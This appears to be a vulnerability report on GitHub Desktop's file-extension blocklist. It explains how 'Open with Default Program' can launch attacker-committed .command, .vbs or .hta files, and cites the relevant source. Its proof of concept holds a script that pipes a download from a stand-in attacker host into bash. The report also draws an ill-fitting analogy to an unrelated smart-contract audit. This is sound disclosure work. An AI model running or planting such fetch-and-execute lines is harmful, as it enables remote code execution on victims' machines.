## Analysis

The `isSafeFileExtension` gate in `app/src/ui/lib/context-menu.ts` is the security control meant to stop "Open with Default Program" from launching attacker-controlled repository content directly — conceptually the same role that `safeMint`/`onERC721Received` plays in the C4 report (a check that's supposed to guarantee the receiving side can "safely handle" untrusted input before an irreversible action is taken). Just like the report's finding that the mint path uses the *unsafe* variant, this gate uses an incomplete, platform-inconsistent blocklist instead of a safe default.### Title
Incomplete/absent "safe extension" blocklist lets a cloned repo's committed file auto-execute via "Open with Default Program" - (File: `app/src/ui/lib/context-menu.ts`)

### Summary
`isSafeFileExtension()` is the guard that decides whether the "Open with Default Program" context-menu action is enabled for a file coming from a repository the user cloned/fetched/checked out. It is meant to stop Desktop from being used as a launcher for attacker-controlled executable content, exactly the role `safeMint`/`onERC721Received` plays in the referenced report (a check meant to guarantee unsafe input can't slip through an otherwise-convenient action). Instead of a safe allowlist, it uses a tiny, platform-inconsistent blocklist.

### Finding Description [1](#0-0) 

```ts
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
...
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
```

- On macOS/Linux the function **unconditionally returns `true`** — there is no blocklist at all.
- On Windows the blocklist only covers `.cmd`, `.exe`, `.bat`, `.sh`. It omits well-known auto-launchable/dangerous extensions such as `.vbs`, `.js`/`.jse`, `.wsf`, `.hta`, `.msi`, `.msc`, `.scr`, `.pif`, `.com`, `.lnk`, `.jar`, `.reg`, `.cpl`, `.gadget`, `.application`, `.ps1` (with `-File` handlers), etc.

`isSafeExtension` gates the `OpenWithDefaultProgramLabel` menu item in every file-context-menu implementation: [2](#0-1) [3](#0-2) [4](#0-3) 

When the action fires, it calls `openFile()`, which hands the path straight to the OS shell handler: [5](#0-4) 

`shell.openExternal('file://...')` is equivalent to double-clicking the file in Finder/Explorer — for many of the extensions above the OS's "default program" *is* to execute the file (e.g. macOS treats `.command` files as executable scripts opened directly in Terminal; Windows auto-runs `.vbs`/`.js`/`.wsf`/`.hta`/`.jar`/`.msi`/`.scr` through their respective interpreters, and `.lnk` can point at an arbitrary target).

The broken invariant: the file being opened originates from repository content the user does not control — a cloned/fetched repo, a checked-out PR branch, or a commit under review. The blocklist is meant to be the boundary that keeps "view/open" actions from becoming "execute" actions, but it fails to cover the actual set of dangerous OS launch types, and on macOS/Linux it doesn't exist at all.

### Impact Explanation
An attacker who controls a repository (or a branch/PR that a Desktop user clones, fetches, or checks out through the app's own "Open in Desktop" / PR checkout flow) can commit a file such as `readme_invoice.command` (macOS) or `update_report.vbs` / `notes.hta` / `license.jar` (Windows). When the victim right-clicks that file in the Changes list, History file list, or PR "Files changed" view and selects "Open with Default Program" — a normal, expected Desktop feature — the file is executed via the OS default handler rather than merely displayed/opened for editing. This is arbitrary code execution on the victim's machine, driven entirely by content the attacker supplied through a git object, matching the "attacker controls a cloned/fetched repository ... result is code execution" criterion.

### Likelihood Explanation
Medium-high. It requires the victim to explicitly choose "Open with Default Program" on a specific file — a legitimate, commonly-used Desktop feature, not an "unnatural" step — after cloning/checking out a malicious or compromised repo/PR. No admin rights, local access, or pre-existing malware is needed. The macOS case is unconditionally exploitable (no blocklist whatsoever); the Windows case merely requires picking any extension outside the 4-item list.

### Recommendation
- Replace the blocklist with a strict allowlist of extensions known to be safe to hand to the OS "open" action (documents, images, text, etc.), or
- At minimum, extend `RestrictedFileExtensions` to cover all known OS-executable/auto-launch extensions on every platform (Windows: `.exe .com .bat .cmd .vbs .vbe .js .jse .wsf .wsh .msc .msi .msp .mst .scr .pif .lnk .reg .cpl .gadget .application .hta .jar .ps1 .ps1xml .psc1 .cnt`; macOS: `.command .app .pkg .scpt .workflow .action`), and
- Apply the same restriction unconditionally (not only under `__WIN32__`) so macOS/Linux get real protection.

### Proof of Concept
1. Attacker publishes/pushes a repository (or PR branch) containing `invoice.command`:
   ```
   #!/bin/bash
   curl -s https://attacker.example/payload | bash
   ```
2. Victim clones the repo, or checks out the PR, in GitHub Desktop.
3. Victim right-clicks `invoice.command` in the Changes/History/PR-files list and selects "Open with Default Program" (`OpenWithDefaultProgramLabel`), enabled because `isSafeFileExtension('.command')` returns `true` unconditionally (non-Windows branch of `app/src/ui/lib/context-menu.ts`).
4. `onOpenItem`/`onOpenFile` calls `openFile(fullPath, dispatcher)` → `shell.openExternal('file:///.../invoice.command')`.
5. macOS opens `.command` files by executing them in Terminal, running the attacker's script with the victim's privileges.

(The equivalent Windows PoC substitutes `payload.vbs`/`payload.hta`/`payload.jar`, none of which appear in `RestrictedFileExtensions`.)

### Citations

**File:** app/src/ui/lib/context-menu.ts (L1-38)
```typescript
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
export const CopyFilePathLabel = __DARWIN__
  ? 'Copy File Path'
  : 'Copy file path'

export const CopyRelativeFilePathLabel = __DARWIN__
  ? 'Copy Relative File Path'
  : 'Copy relative file path'

export const CopySelectedPathsLabel = __DARWIN__ ? 'Copy Paths' : 'Copy paths'

export const CopySelectedRelativePathsLabel = __DARWIN__
  ? 'Copy Relative Paths'
  : 'Copy relative paths'

export const DefaultEditorLabel = __DARWIN__
  ? 'Open in External Editor'
  : 'Open in external editor'

export const DefaultShellLabel = __DARWIN__ ? 'Open in Shell' : 'Open in shell'

export const RevealInFileManagerLabel = __DARWIN__
  ? 'Reveal in Finder'
  : __WIN32__
  ? 'Show in Explorer'
  : 'Show in your File Manager'

export const TrashNameLabel = __WIN32__ ? 'Recycle Bin' : 'Trash'

export const OpenWithDefaultProgramLabel = __DARWIN__
  ? 'Open with Default Program'
  : 'Open with default program'

export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
```

**File:** app/src/ui/changes/filter-changes-list.tsx (L790-800)
```typescript
    const enabled = status.kind !== AppFileStatusKind.Deleted
    items.push(
      { type: 'separator' },
      this.getRevealInFileManagerMenuItem(file),
      this.getOpenInExternalEditorMenuItem(file, enabled),
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.props.onOpenItem(path),
        enabled: enabled && isSafeExtension,
      }
    )
```

**File:** app/src/ui/history/selected-commits.tsx (L398-420)
```typescript
    const extension = Path.extname(file.path)

    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor = externalEditorLabel
      ? `Open in ${externalEditorLabel}`
      : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => this.props.onOpenInExternalEditor(file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenItem(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
```

**File:** app/src/ui/open-pull-request/pull-request-files-changed.tsx (L178-200)
```typescript
    const extension = Path.extname(file.path)
    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor =
      externalEditorLabel !== undefined
        ? `Open in ${externalEditorLabel}`
        : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => dispatcher.openInExternalEditor(fullPath),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenFile(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
```

**File:** app/src/ui/lib/open-file.ts (L1-17)
```typescript
import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}
```
